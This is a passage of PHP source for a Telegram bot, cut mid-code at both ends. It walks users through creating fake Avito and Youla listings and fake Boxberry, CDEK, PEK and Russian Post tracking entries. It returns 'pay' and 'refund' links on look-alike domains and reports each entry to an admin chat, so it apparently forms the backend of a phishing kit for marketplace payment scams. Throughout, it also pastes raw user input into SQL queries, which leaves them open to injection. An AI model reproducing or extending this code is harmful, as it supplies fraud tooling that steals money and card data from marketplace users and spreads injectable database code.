								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif($advert['delivery'] == '-1') {
							if(preg_match('/^[0-9]{2,6}$/i', $message['text']) == TRUE OR $message['text'] == '0') {
								
								mysqli_query($connection, "UPDATE `adverts` SET `delivery` = '$message[text]' WHERE `id` = '$advert[id]'");
								$text = str_replace("\t", "", $bot_chat['create_advert']['asks']['5']);
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								
							} else {
								$text = $bot_chat['create_advert']['errors']['4'];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($advert['image'])) {
							if(preg_match('/^(http|https):\/\/cache\d.youla.io\/files\/images\/.+.jpg/i', $message['text']) == TRUE OR preg_match('/^(http|https):\/\/\d{1,3}.img.avito.st\/\d{3,4}x\d{3,4}\/\d+.jpg/i', $message['text']) == TRUE OR preg_match('/^(http|https):\/\/i.imgur.com\/.+.jpg/i', $message['text']) == TRUE) {
								mysqli_query($connection, "UPDATE `adverts` SET `image` = '$message[text]', `status` = '1', `time` = '".time()."' WHERE `id` = '$advert[id]'");
								if($advert['delivery'] != '0'){
									$delivery = $advert['delivery'];
								}else{
									$delivery = $settings['delivery'];
								}
								$text = str_replace("\t", "", sprintf($bot_chat['create_advert']['success_user'], $advert['advert_id'], $advert['title'], $advert['price'], $delivery));
								
								if($advert['type'] == 0) {
									$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_advert']['keyboard']['pay'], 'url' => $links['avito'].'/buy/'.$advert['advert_id']), Array('text' => $bot_chat['create_advert']['keyboard']['refund'], 'url' => $links['avito'].'/refund/'.$advert['advert_id']))));
								} elseif($advert['type'] == 1) {
									$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_advert']['keyboard']['pay'], 'url' => $links['youla'].'/buy/'.$advert['advert_id']), Array('text' => $bot_chat['create_advert']['keyboard']['refund'], 'url' => $links['youla'].'/refund/'.$advert['advert_id']))));
								} else {
									$keyboard = Array('inline_keyboard' => Array(Array()));
								}
								
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
							
								$text = str_replace("\t", "", sprintf($bot_chat['create_advert']['success_admin'], $message['from'], $message['firstname'], $message['lastname'], $advert['advert_id'], $advert['title'], $advert['price'], $delivery));
								
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
							} else {
								$text = str_replace("\t", "", $bot_chat['create_advert']['errors']['5']);
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					} elseif(mysqli_num_rows($tracks) > 0) {

						$track = mysqli_fetch_assoc($tracks);
						
						if(empty($track['sender'])) {
							if(preg_match('/\S{2,35} \S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `sender` = '".ucwords($message['text'])."' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["boxberry"]["2"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["boxberry"]["1"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['product'])) {
							if(mb_strlen($message['text']) <= 50) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `product` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["boxberry"]["3"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["boxberry"]["2"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['courier']) AND $track['courier'] != '0') {
							if((preg_match('/\S{2,35} \S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) OR $message['text'] == 0) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `courier` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["boxberry"]["4"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["boxberry"]["3"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['weight'])) {
							if(preg_match('/^[0-9]+$/i', $message['text']) == TRUE) {
								if(strlen($message['text']) >= 4) {
									$weight = round($message['text'], -2)/1000 . ' кг';
								} else {
									$weight = $message['text'].' гр';
								}
								
								mysqli_query($connection, "UPDATE `trackcodes` SET `weight` = '$weight' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["boxberry"]["5"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["boxberry"]["4"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['amount'])) {
							if(preg_match('/^[0-9]{2,6}$/i', $message['text']) == TRUE) {
								if($message['text'] >= $settings['min_price'] AND $message['text'] <= $settings['max_price']) {
									mysqli_query($connection, "UPDATE `trackcodes` SET `amount` = '$message[text]' WHERE `id` = '$track[id]'");
									
									$text = $bot_chat["create_track"]["asks"]["boxberry"]["6"];
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = sprintf($bot_chat["create_track"]["errors"]["boxberry"]["5"], $settings['min_price'], $settings['max_price']);
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = sprintf($bot_chat["create_track"]["errors"]["boxberry"]["5"], $settings['min_price'], $settings['max_price']);
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['equipment']) AND $track['equipment'] != '0') {
							if((mb_strlen($message['text']) <= 250 AND mb_strlen($message['text']) >= 2) OR $message['text'] == '0') {
								mysqli_query($connection, "UPDATE `trackcodes` SET `equipment` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["boxberry"]["7"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["boxberry"]["6"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['recipient'])) {
							if(preg_match('/\S{2,35} \S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `recipient` = '".ucwords($message['text'])."' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["boxberry"]["8"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["boxberry"]["7"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['city'])) {
							if(mb_strlen($message['text']) <= 20) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `city` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["boxberry"]["9"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["boxberry"]["8"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['address'])) {
							if(mb_strlen($message['text']) <= 100) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `address` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["boxberry"]["10"];

								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["boxberry"]["9"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['phone'])) {
							if(preg_match('/\+{0,1}\d{11}/i', $message['text']) == TRUE OR preg_match('/\+7 \(\d{3}\) \d{3}-\d{2}-\d{2}/i', $message['text']) == TRUE) {
								if(preg_match('/\+7 \(\d{3}\) \d{3}-\d{2}-\d{2}/i', $message['text']) == TRUE) {
									$edit = $message['text'];
								} else {
									$phone = str_replace('+', '', $message['text']);
									$edit = '+'.substr($phone, 0, 1).' ('.substr($phone, 1, 3).') '.substr($phone, 4, 3).'-'.substr($phone, 7, 2).'-'.substr($phone, 9, 2);
								}
								
								mysqli_query($connection, "UPDATE `trackcodes` SET `phone` = '$edit', `status` = '1' WHERE `id` = '$track[id]'");
								
								$text = str_replace("\t", "", sprintf($bot_chat['create_track']['template_track_u'], $track['code'], $track['product'], $track['amount']));

								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_track']['url_button'], 'url' => $links['boxberry'].'/track/'.$track['code'])))));
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								
								$text = str_replace("\t", "", sprintf($bot_chat['create_track']['template_track_a'], $message['from'], $message['firstname'], $message['lastname'], $track['code'], $track['product'], $track['amount']));

								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_track']['url_button'], 'url' => $links['boxberry'].'/track/'.$track['code'])))));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							} else {
								$text = $bot_chat["create_track"]["errors"]["boxberry"]["10"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					} elseif(mysqli_num_rows($dtracks) > 0) {

						$track = mysqli_fetch_assoc($dtracks);

						if(empty($track['sender'])) {
							if(preg_match('/\S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) {
								mysqli_query($connection, "UPDATE `trackcodessdek` SET `sender` = '".ucwords($message['text'])."' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["cdek"]["2"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["1"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['recipient'])) {
							if(preg_match('/\S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) {
								mysqli_query($connection, "UPDATE `trackcodessdek` SET `recipient` = '".ucwords($message['text'])."' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["cdek"]["3"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["2"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['address_from'])) {
							if(mb_strlen($message['text']) <= 20) {
								mysqli_query($connection, "UPDATE `trackcodessdek` SET `address_from` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["cdek"]["4"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["3"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['address_to'])) {
							if(mb_strlen($message['text']) <= 20) {
								
								mysqli_query($connection, "UPDATE `trackcodessdek` SET `address_to` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["cdek"]["5"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["4"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['address'])) {
							if(mb_strlen($message['text']) <= 100) {
								mysqli_query($connection, "UPDATE `trackcodessdek` SET `address` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["cdek"]["6"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["5"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['date_start'])) {
							if(preg_match('/\d{2}.\d{2}.\d{4}/', $message['text']) == TRUE) {

								mysqli_query($connection, "UPDATE `trackcodessdek` SET `date_start` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["cdek"]["7"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["6"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['date_end'])) {
							if(preg_match('/\d{2}\.\d{2}\.\d{4}/i', $message['text']) == TRUE) {
								mysqli_query($connection, "UPDATE `trackcodessdek` SET `date_end` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["cdek"]["8"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["7"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['phone'])) {
							if(preg_match('/\+{0,1}\d{11}/i', $message['text']) == TRUE OR preg_match('/\+7 \(\d{3}\) \d{3}-\d{2}-\d{2}/i', $message['text']) == TRUE) {
								if(preg_match('/\+7 \(\d{3}\) \d{3}-\d{2}-\d{2}/i', $message['text']) == TRUE) {
									$edit = $message['text'];
								} else {
									$phone = str_replace('+', '', $message['text']);
									$edit = '+'.substr($phone, 0, 1).' ('.substr($phone, 1, 3).') '.substr($phone, 4, 3).'-'.substr($phone, 7, 2).'-'.substr($phone, 9, 2);
								}
								
								mysqli_query($connection, "UPDATE `trackcodessdek` SET `phone` = '$edit' WHERE `id` = '$track[id]'");
								$text = $bot_chat["create_track"]["asks"]["cdek"]["9"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["8"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['product'])) {
							if(mb_strlen($message['text']) <= 50) {
								mysqli_query($connection, "UPDATE `trackcodessdek` SET `product` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["cdek"]["10"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["9"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['amount'])) {
							if(preg_match('/^[0-9]{2,5}$/i', $message['text']) == TRUE) {
								if($message['text'] >= $settings['min_price'] AND $message['text'] <= $settings['max_price']) {

									mysqli_query($connection, "UPDATE `trackcodessdek` SET `amount` = '$message[text]' WHERE `id` = '$track[id]'");
									$text = $bot_chat["create_track"]["asks"]["cdek"]["11"];
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = sprintf($bot_chat["create_track"]["errors"]["cdek"]["10"], $settings['min_price'], $settings['max_price']);
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = sprintf($bot_chat["create_track"]["errors"]["cdek"]["10"], $settings['min_price'], $settings['max_price']);
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['equipment']) OR $track['equipment'] != '0'){
							if((mb_strlen($message['text']) <= 250 AND mb_strlen($message['text']) >= 2) OR $message['text'] == '0') {

								mysqli_query($connection, "UPDATE `trackcodessdek` SET `equipment` = '$message[text]', `status` = '1' WHERE `id` = '$track[id]'");

								$text = str_replace("\t", "", sprintf($bot_chat['create_track']['template_track_u'], $track['code'], $track['product'], $track['amount']));

								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_track']['url_button'], 'url' => $links['cdek'].'/track/'.$track['code'])))));
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								
								$text = str_replace("\t", "", sprintf($bot_chat['create_track']['template_track_a'], $message['from'], $message['firstname'], $message['lastname'], $track['code'], $track['product'], $track['amount']));

								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_track']['url_button'], 'url' => $links['cdek'].'/track/'.$track['code'])))));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							} else {
								$text = $bot_chat["create_track"]["errors"]["cdek"]["11"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					} elseif(mysqli_num_rows($ptracks) > 0){
						$track = mysqli_fetch_assoc($ptracks);

						if(empty($track['sender'])) {
							if(preg_match('/\S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) {
								mysqli_query($connection, "UPDATE `trackcodespek` SET `sender` = '".ucwords($message['text'])."' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pek"]["2"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pek"]["1"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['weight'])) {
							if(preg_match('/^[0-9]+$/i', $message['text']) == TRUE) {

								mysqli_query($connection, "UPDATE `trackcodespek` SET `weight` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pek"]["3"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pek"]["2"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['address'])) {
							if(mb_strlen($message['text']) <= 100) {
								mysqli_query($connection, "UPDATE `trackcodespek` SET `address` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pek"]["4"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pek"]["3"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['date_start'])) {
							if(preg_match('/\d{2}.\d{2}.\d{4}/', $message['text']) == TRUE) {

								mysqli_query($connection, "UPDATE `trackcodespek` SET `date_start` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pek"]["5"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pek"]["4"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['date_check'])) {
							if(preg_match('/\d{2}\.\d{2}\.\d{4}/i', $message['text']) == TRUE) {
								mysqli_query($connection, "UPDATE `trackcodespek` SET `date_check` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pek"]["6"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pek"]["5"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['product'])) {
							if(mb_strlen($message['text']) <= 50) {
								mysqli_query($connection, "UPDATE `trackcodespek` SET `product` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pek"]["7"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pek"]["6"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['amount'])) {
							if(preg_match('/^[0-9]{2,5}$/i', $message['text']) == TRUE) {
								if($message['text'] >= $settings['min_price'] AND $message['text'] <= $settings['max_price']) {

									mysqli_query($connection, "UPDATE `trackcodespek` SET `amount` = '$message[text]', `status` = '1' WHERE `id` = '$track[id]'");

									$text = str_replace("\t", "", sprintf($bot_chat['create_track']['template_track_u'], $track['code'], $track['product'], $message['text']));

									$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_track']['url_button'], 'url' => $links['pek'].'/track/'.$track['code'])))));
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
									
									$text = str_replace("\t", "", sprintf($bot_chat['create_track']['template_track_a'], $message['from'], $message['firstname'], $message['lastname'], $track['code'], $track['product'], $message['text']));

									$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_track']['url_button'], 'url' => $links['pek'].'/track/'.$track['code'])))));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));

								} else {
									$text = sprintf($bot_chat["create_track"]["errors"]["pek"]["10"], $settings['min_price'], $settings['max_price']);
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = sprintf($bot_chat["create_track"]["errors"]["pek"]["10"], $settings['min_price'], $settings['max_price']);
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					} elseif(mysqli_num_rows($pstracks) > 0) {

						$track = mysqli_fetch_assoc($pstracks);

						if(empty($track['sender'])) {
							if(preg_match('/\S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) {
								mysqli_query($connection, "UPDATE `trackcodespost` SET `sender` = '".ucwords($message['text'])."' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pochta"]["2"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pochta"]["1"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['recipient'])) {
							if(preg_match('/\S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) {
								mysqli_query($connection, "UPDATE `trackcodespost` SET `recipient` = '".ucwords($message['text'])."' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pochta"]["3"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pochta"]["2"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['address_from'])) {
							if(mb_strlen($message['text']) <= 20) {
								mysqli_query($connection, "UPDATE `trackcodespost` SET `address_from` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pochta"]["4"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pochta"]["3"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['address_to'])) {
							if(mb_strlen($message['text']) <= 20) {
								
								mysqli_query($connection, "UPDATE `trackcodespost` SET `address_to` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pochta"]["5"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pochta"]["4"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['date_start'])) {
							if(preg_match('/\d{2}.\d{2}.\d{4}/', $message['text']) == TRUE) {

								mysqli_query($connection, "UPDATE `trackcodespost` SET `date_start` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pochta"]["6"];
